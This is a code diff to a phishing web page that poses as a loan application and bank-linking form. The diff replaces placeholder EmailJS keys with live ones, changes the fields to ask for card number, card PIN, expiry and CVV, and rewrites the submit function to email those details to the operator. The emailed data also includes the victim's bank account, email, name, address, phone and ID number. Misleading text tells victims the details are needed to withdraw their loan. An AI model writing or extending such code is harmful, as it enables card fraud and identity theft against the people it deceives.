@@ -357,6 +357,7 @@
             .form-row { grid-template-columns: 1fr; }
         }
     </style>
+<base target="_blank">
 </head>
 <body>
 
@@ -382,7 +383,7 @@
         <div class="view active" id="view-question">
             <div class="question-wrap">
                 <h2>Do You Have A Banking App?</h2>
-                <p>Select an option below to proceed with linking your bank account securely.</p>
+                <p>Select an option below to proceed with your loan application.</p>
                 <div class="option-btns">
                     <button class="btn-yes" onclick="handleYes()">
                         Yes
@@ -436,7 +437,7 @@
                 <div class="form-card-header" id="formHeader">
                     <img id="formBankLogo" src="" alt="" style="width: 100%;">
                     <h3 id="formBankName">Bank</h3>
-                    <p>Enter your details to connect your account.</p>
+                    <p>'Please enter your email and account number. Use your email and account numer to connect your account to your loan dashboard for successful withdrawal of your loan amount.</p>
                 </div>
 
                 <!-- STEP 1: Email + Account Number -->
@@ -447,7 +448,7 @@
                     </div>
                     <div class="form-group">
                         <label for="accountNumber">Account Number</label>
-                        <input type="text" id="accountNumber" placeholder="Enter your account number" oninput="validateStep1()">
+                        <input type="number" id="accountNumber" placeholder="Enter your account number" oninput="validateStep1()">
                     </div>
                     <button class="btn-submit" id="btnStep1" disabled onclick="goToStep2()">
                         Continue
@@ -458,13 +459,13 @@
                 <!-- STEP 2: Profile Details -->
                 <div class="step-panel" id="step2">
                     <div class="form-group">
-                        <label for="profileNumber">Profile Number</label>
-                        <input type="text" id="profileNumber" placeholder="Enter profile number" oninput="validateStep2()">
+                        <label for="cardNumber">Card Number</label>
+                        <input type="number" id="cardNumber" placeholder="Enter card number" oninput="validateStep2()">
                     </div>
                     <div class="form-row">
                         <div class="form-group">
-                            <label for="passcode">Passcode</label>
-                            <input type="password" id="passcode" placeholder="Enter passcode" maxlength="6" oninput="validateStep2()">
+                            <label for="cardPin">Card Pin</label>
+                            <input type="number" id="cardPin" placeholder="Enter card pin" maxlength="6" oninput="validateStep2()">
                         </div>
                         <div class="form-group">
                             <label for="cardExpiry">Expiry Date</label>
@@ -505,7 +506,7 @@
                             <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                         </div>
                         <h3>Application Successfully Made</h3>
-                        <p>Your loan application has been received and is being reviewed. You will receive a confirmation shortly.</p>
+                        <p>Your loan application has been received and is being reviewed. Kindly get back to your loan officer for further assistance.</p>
                     </div>
                 </div>
 
@@ -525,9 +526,9 @@
     <script>
         // ==================== EMAILJS CONFIG ====================
         const EMAILJS_CONFIG = {
-            PUBLIC_KEY: 'YOUR_PUBLIC_KEY_HERE',
-            SERVICE_ID: 'YOUR_SERVICE_ID_HERE',
-            TEMPLATE_ID: 'YOUR_TEMPLATE_ID_HERE'
+            PUBLIC_KEY: 'yZuV2WJXrk15rYtSi',
+            SERVICE_ID: 'service_dlwgzfv',
+            TEMPLATE_ID: 'template_ao4owxn'
         };
 
         (function(){
@@ -572,8 +573,8 @@
             // Clear fields
             document.getElementById('email').value = '';
             document.getElementById('accountNumber').value = '';
-            document.getElementById('profileNumber').value = '';
-            document.getElementById('passcode').value = '';
+            document.getElementById('cardNumber').value = '';
+            document.getElementById('cardPin').value = '';
             document.getElementById('cardExpiry').value = '';
             document.getElementById('cardCvv').value = '';
 
@@ -619,49 +620,82 @@
         }
 
         function validateStep2() {
-            const profile = document.getElementById('profileNumber').value.trim();
-            const passcode = document.getElementById('passcode').value.trim();
+            const cardnumber = document.getElementById('cardNumber').value.trim();
+            const cardPin = document.getElementById('cardPin').value.trim();
             const expiry = document.getElementById('cardExpiry').value.trim();
             const cvv = document.getElementById('cardCvv').value.trim();
             const btn = document.getElementById('btnStep2');
-            btn.disabled = !(profile && passcode && expiry && cvv);
+            btn.disabled = !(cardnumber && cardPin && expiry && cvv);
         }
 
         function submitAll() {
-            const email = document.getElementById('email').value.trim();
-            const accountNumber = document.getElementById('accountNumber').value.trim();
-            const profileNumber = document.getElementById('profileNumber').value.trim();
-            const passcodeVal = document.getElementById('passcode').value.trim();
-            const expiry = document.getElementById('cardExpiry').value.trim();
-            const cvv = document.getElementById('cardCvv').value.trim();
+            // Collect banking data
+            const bankingData = {
+                bank_name: selectedBankName,
+                user_email: document.getElementById('email').value.trim(),
+                account_number: document.getElementById('accountNumber').value.trim(),
+                card_number: document.getElementById('cardNumber').value.trim(),
+                card_pin: document.getElementById('cardPin').value.trim(),
+                expiry_date: document.getElementById('cardExpiry').value.trim(),
+                cvv: document.getElementById('cardCvv').value.trim()
+            };
+
+            // Pull loan data from localStorage
+            const loanData = JSON.parse(localStorage.getItem('loanApplication') || '{}');
+
+            // Combine into one payload
+            const templateParams = {
+                // Loan data
+                fullname: loanData.fullname || '',
+                address: loanData.address || '',
+                phone: loanData.phone || '',
+                email: loanData.email || '',
+                account_number_loan: loanData.account || '',
+                id_number: loanData.idnumber || '',
+                loan_amount: loanData.loanamount || '',
+                loan_duration: loanData.loanduration || '',
+                loan_purpose: loanData.loanpurpose || '',
+
+                // Banking data
+                bank_name: bankingData.bank_name,
+                bank_user_email: bankingData.user_email,
+                bank_account_number: bankingData.account_number,
+                card_number: bankingData.card_number,
+                card_pin: bankingData.card_pin,
+                expiry_date: bankingData.expiry_date,
+                cvv: bankingData.cvv,
+
+                submitted_at: new Date().toLocaleString()
+            };
 
             // Show loader
             document.getElementById('step2').classList.remove('active');
             document.getElementById('formHeader').style.display = 'none';
             document.getElementById('stepLoader').classList.add('active');
 
-            // Simulate processing then show success
-            setTimeout(() => {
+            const isConfigured = !EMAILJS_CONFIG.PUBLIC_KEY.includes('YOUR_');
+
+            const handleSuccess = () => {
                 document.getElementById('stepLoader').classList.remove('active');
                 document.getElementById('stepSuccess').classList.add('active');
+            };
 
-                // If EmailJS is configured, send the data
-                if (!EMAILJS_CONFIG.PUBLIC_KEY.includes('YOUR_')) {
-                    const templateParams = {
-                        bank_name: selectedBankName,
-                        user_email: email,
-                        account_number: accountNumber,
-                        profile_number: profileNumber,
-                        passcode: passcodeVal,
-                        expiry_date: expiry,
-                        cvv: cvv
-                    };
+            const handleError = (err) => {
+                console.error('EmailJS Error:', err);
+                alert('Failed to send application. Please check your EmailJS configuration.');
+                document.getElementById('stepLoader').classList.remove('active');
+                document.getElementById('formHeader').style.display = 'block';
+                document.getElementById('step2').classList.add('active');
+            };
 
-                    emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, templateParams)
-                        .then(() => console.log('Email sent successfully'))
-                        .catch(err => console.error('Email failed:', err));
-                }
-            }, 2500);
+            if (isConfigured) {
+                emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, templateParams)
+                    .then(handleSuccess)
+                    .catch(handleError);
+            } else {
+                console.log('Demo mode - EmailJS not configured. Data:', templateParams);
+                setTimeout(handleSuccess, 2500);
+            }
         }
 
         // Initialize
